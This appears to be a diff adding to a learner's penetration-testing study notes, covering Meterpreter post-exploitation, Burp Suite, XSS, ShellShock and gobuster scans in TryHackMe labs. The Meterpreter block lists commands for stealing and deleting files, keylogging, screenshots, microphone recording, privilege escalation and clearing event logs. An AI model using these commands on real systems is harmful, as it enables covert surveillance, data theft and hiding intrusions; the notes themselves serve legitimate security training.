@@ -537,6 +537,64 @@ attackers.
 #+end_src
 
 ** Maintaining Access (Optional)
+
+Now it's time to understand what to do after we get access to the target system.
+
+The most simple thing to do is to look at the target files, looking for
+passwords or some sensitive data. We can do all of this just using the
+meterpreter shell using simple commands.
+
+*** Meterpreter shell
+
+#+begin_src bash
+  # Considering that we already have access to the target system.
+  #
+  # Let's check the help command
+  help
+
+  # Download file from the target machine
+  download <FILE_PATH>
+
+  # Upload file to the target machine
+  upload <FILE_PATH>
+
+  # Remove files from target machine
+  rm <FILE_PATH>
+
+  # Notice that some of those commands can fail if you're not an administrator.
+  #
+  # ======================================================
+  #
+  # Peripherals - Microphone, Keyboard, Screen, Camera
+  #
+  # We can use the meterpreter to trigger events in peripherals of the target
+  # computer.
+  keyscan_start # keylogger application
+  keyscan_dump
+  keyscan_stop
+
+  # Take a screenshot of the target environment.
+  screenshot
+
+  # Watch target desktop in real time.
+  # This command is a bit buggy because it requires some power to run properly.
+  screenshare
+
+  # Record microphone
+  record_mic -d 10 # record for 10 seconds
+
+  # Try to scale your privileges in the target machine:
+  getsystem
+
+  # Clear your steps
+  clearev
+#+end_src
+
+**** Privilege Scalation
+
+There are many advanced techniques that could be used to elevate privileges and
+this topic is very broad.
+
 ** Covering Tracks
 
 * Useful Linux Commands
@@ -723,6 +781,30 @@ lessons.
 
 #+RESULTS:
 
+* Website Application Testing Theory
+
+Along with the process of attacking a VM through the network, another big sector
+of the computer security area is only focused into the safety of web
+applications.
+
+** Information Gathering & Dirb Tool
+
+This is the first step when studying some target website. We can use ~dirb~ to
+scan for a specific target site. This tool is already available in Kali Linux
+distribution.
+
+** BurpSuite
+
+This tool is the most used for web applications attack. It is already available
+in Kali Linux distributions (Community version).
+
+** ShellShock Exploitation
+
+This vulnerability, although not common nowadays, was one of the most critical
+ever found. Since this vulnerability is almost always patched, the instructor
+decided to download a specific ISO from the ~pentesterlab~ to simulate this
+vulnerability.
+
 * Complement: TryHackMe
 
 Platform [[https://tryhackme.com/][link]].
@@ -749,3 +831,122 @@ many capabilities, below is a table summarising some of the functionality it
 provides.
 
 *** Locating directories using GoBuster
+** Burp Suite: The Basics
+
++ [[https://tryhackme.com/room/burpsuitebasics][Room link]]
+
+In reality I did not went directly to this room in the beginning. I just went to
+it due to a necessity before I was able to advance a different room.
+
+The goals of this room are to cover:
+
++ What Burp Suite is
++ An overview of the available tools in the framework
++ Installing Burp Suite for yourself
++ Navigating and configuring Burp Suite
++ Introduce the core of the Burp Suite framework: the Burp Proxy
+
+*** What is Burp Suite?
+
+Is a framework written in Java that aims to provide a one-stop-shop for web
+application penetration testing. Burp is very much the industry standard tool
+for hands-on web app security assessments.
+
+Burp Suite is also very commonly used when assessing mobile applications, as the
+same features which make it so attractive for web app testing translate almost
+perfectly into testing the APIs (Application Programming Interfaces) powering
+most mobile apps.
+
+This tool is available in 3 different plans:
+
++ Community: Is free, although it is limited;
++ Professional: Expensive but with full capabilities;
++ Enterprise: Used for continuous scanning in servers;
+
+*** How it works?
+
+At the simplest level, Burp can capture and manipulate all of the traffic
+between an attacker and a webserver: this is the core of the framework. After
+capturing requests, we can choose to send them to various other parts of the
+Burp Suite framework.
+
+The Burp Proxy is the most fundamental (and most important!) of the tools
+available in Burp Suite. It allows us to capture requests and responses between
+ourselves and our target. These can then be manipulated or sent to other tools
+for further processing before being allowed to continue to their destination.
+
+*** Features
+
+Whilst Burp Community has a relatively limited feature-set compared to the
+Professional edition, it still has many superb tools available. These include:
+
++ Proxy: The most well-known aspect of Burp Suite, the Burp Proxy allows us to
+  intercept and modify requests/responses when interacting with web
+  applications.
++ Repeater: The second most well-known Burp feature -- Repeater -- allows us to
+  capture, modify, then resend the same request numerous times. This feature can
+  be absolutely invaluable, especially when we need to craft a payload through
+  trial and error (e.g. in an SQLi -- Structured Query Language Injection) or
+  when testing the functionality of an endpoint for flaws.
++ Intruder: Although harshly rate-limited in Burp Community, Intruder allows us
+  to spray an endpoint with requests. This is often used for bruteforce attacks
+  or to fuzz endpoints.
++ Decoder: Though less-used than the previously mentioned features, Decoder
+  still provides a valuable service when transforming data -- either in terms of
+  decoding captured information, or encoding a payload prior to sending it to
+  the target. Whilst there are other services available to do the same job,
+  doing this directly within Burp Suite can be very efficient.
++ Comparer: As the name suggests, Comparer allows us to compare two pieces of
+  data at either word or byte level. Again, this is not something that is unique
+  to Burp Suite, but being able to send (potentially very large) pieces of data
+  directly into a comparison tool with a single keyboard shortcut can speed
+  things up considerably.
++ Sequencer: We usually use Sequencer when assessing the randomness of tokens
+  such as session cookie values or other supposedly random generated data. If
+  the algorithm is not generating secure random values, then this could open up
+  some devastating avenues for attack.
+
+In addition to the myriad of in-built features, the Java codebase also makes it
+very easy to write extensions to add to the functionality of the Burp framework.
+
+*** Cross-Site Scripting (XSS)
+
+Cross-Site Scripting (or XSS) is injecting a client-side script (usually in
+JavaScript) into a webpage in such a way that it executes. There are various
+kinds of XSS. Example:
+
++ Reflected XSS
+
+** Vulnversity
+
+*** Locating directories using GoBuster
+
+When using the gobuster software to brute-force URIs (directories and files),
+DNS subdomains and virtual host names, I got a better output when using the
+~rockyou.txt~ wordlist. The only bad part is that the process is *very slow*, it
+took some minutes until finished scanning.
+
+#+begin_src bash
+  gobuster dir -u http:<IP>:3333 -w /usr/share/wordlist/rockyou.txt
+  # this file is 136 Mb long
+#+end_src
+
+One can find more information about the wordlist presented in Kali Linux by
+going for this link: https://www.kali.org/tools/wordlists/.
+
+Since this process was taking much time I decided to use other wordlists. So I
+used this other file and got the results faster:
+
+#+begin_src bash
+  gobuster dir -u http:<IP>:3333 -w /usr/share/wordlist/dirb/common.txt
+#+end_src
+
+*** Compromise the webserver
+
+I had some problems in the task of testing the upload of common file
+extensions. For some reason the page was breaking and although it was not
+allowing me to upload the majority of files, in the challenge page my answers
+were not accepted.
+
+To automate the process of testing this webpage, the tutorial recommends the
+usaged of BurpSuite ([[https://tryhackme.com/room/burpsuitebasics][TryHackMe BurpSuite room]]).
